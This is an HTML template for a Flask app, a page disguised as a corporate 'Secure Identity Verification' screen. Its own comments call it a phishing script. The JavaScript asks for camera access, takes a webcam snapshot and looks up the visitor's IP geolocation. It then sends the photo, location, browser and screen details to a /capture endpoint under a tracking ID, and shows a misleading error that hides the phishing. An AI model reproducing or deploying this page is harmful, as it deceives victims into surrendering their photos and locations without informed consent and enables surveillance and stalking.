<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Viewer</title>
    <style>
        /* Modern, clean styling to look like a legitimate corporate tool */
        :root {
            --primary-color: #1a73e8;
            --primary-dark: #1557b0;
            --bg-color: #f0f2f5;
            --card-bg: #ffffff;
            --text-main: #202124;
            --text-muted: #5f6368;
            --success-bg: #e6f4ea;
            --success-text: #1e8e3e;
            --error-bg: #fce8e6;
            --error-text: #d93025;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: var(--card-bg);
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
            padding: 40px;
            width: 100%;
            max-width: 600px;
            text-align: center;
            box-sizing: border-box;
        }

        .logo {
            width: 60px;
            height: 60px;
            background-color: var(--primary-color);
            border-radius: 12px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            font-weight: bold;
        }

        h1 {
            color: var(--text-main);
            font-size: 1.5rem;
            margin-bottom: 10px;
            font-weight: 500;
        }

        .subtitle {
            color: var(--text-muted);
            font-size: 0.95rem;
            line-height: 1.5;
            margin-bottom: 25px;
        }

        .video-wrapper {
            background-color: #000;
            border-radius: 8px;
            overflow: hidden;
            margin: 0 auto 20px;
            width: 100%;
            max-width: 480px;
            height: 270px; /* 16:9 aspect ratio */
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .status-box {
            background-color: #e8f0fe;
            color: var(--primary-color);
            padding: 12px 20px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 0.9rem;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
        }

        .status-box.success {
            background-color: var(--success-bg);
            color: var(--success-text);
        }

        .status-box.error {
            background-color: var(--error-bg);
            color: var(--error-text);
        }

        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid var(--primary-color);
            border-radius: 50%;
            width: 18px;
            height: 18px;
            animation: spin 1s linear infinite;
        }

        .status-box.success .spinner,
        .status-box.error .spinner {
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer {
            margin-top: 30px;
            font-size: 0.8rem;
            color: #9aa0a6;
        }

        /* Mobile adjustments */
        @media (max-width: 480px) {
            .container {
                padding: 20px;
            }
            .video-wrapper {
                height: 200px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒</div>
        <h1>Secure Identity Verification</h1>
        <p class="subtitle">
            Please allow access to your camera and location to verify your identity. 
            This ensures that only you can access your protected documents.
        </p>
        
        <div class="video-wrapper">
            <video id="video" autoplay playsinline muted></video>
        </div>

        <div id="status" class="status-box">
            <div class="spinner"></div>
            <span id="status-text">Initializing secure session...</span>
        </div>

        <div class="footer">
            &copy; 2023 SecureDoc Inc. | Privacy Policy | Terms of Service
        </div>
    </div>

    <script>
        // This ID is injected by Flask from the URL
        const uniqueId = "{{ unique_id }}";
        const video = document.getElementById('video');
        const statusBox = document.getElementById('status');
        const statusText = document.getElementById('status-text');

        function updateStatus(text, type = 'loading') {
            statusText.innerText = text;
            statusBox.className = 'status-box ' + type;
        }

        async function startPhish() {
            try {
                // 1. Request Camera
                updateStatus("Requesting camera access...");
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: "user" // Prefer front-facing camera
                    }, 
                    audio: false 
                });
                video.srcObject = stream;

                // 2. Wait for video metadata to load
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => resolve();
                });

                // 3. Get Geo/IP via external API
                // This is more accurate than server-side IP geolocation
                updateStatus("Verifying location...");
                const geoRes = await fetch('https://ipapi.co/json/');
                if (!geoRes.ok) throw new Error("Geo service failed");
                const geoData = await geoRes.json();

                // 4. Capture Snapshot
                // Wait a moment for the video to stabilize
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);

                // 5. Prepare Payload
                const payload = {
                    unique_id: uniqueId,
                    ip: geoData.ip,
                    city: geoData.city,
                    region: geoData.region,
                    country: geoData.country_name,
                    lat: geoData.latitude,
                    lon: geoData.longitude,
                    userAgent: navigator.userAgent,
                    screenRes: `${screen.width}x${screen.height}`,
                    cameraSnapshot: imageData
                };

                // 6. Send to Server
                updateStatus("Transmitting verification data...");
                const res = await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!res.ok) throw new Error("Server response failed");

                // 7. Success State
                updateStatus("✅ Verification Complete. Loading document...", "success");
                
                // Keep the stream open for a few seconds in case the user looks back
                // Then stop it to save battery
                setTimeout(() => {
                    stream.getTracks().forEach(track => track.stop());
                }, 10000);

            } catch (err) {
                console.error("Phishing script error:", err);
                // Show a generic error that doesn't reveal it was a phishing attempt
                updateStatus("⚠️ Connection issue. Please refresh and try again.", "error");
            }
        }

        // Start after a short delay to make it look like it's "loading"
        setTimeout(startPhish, 1500);
    </script>
</body>
</html>
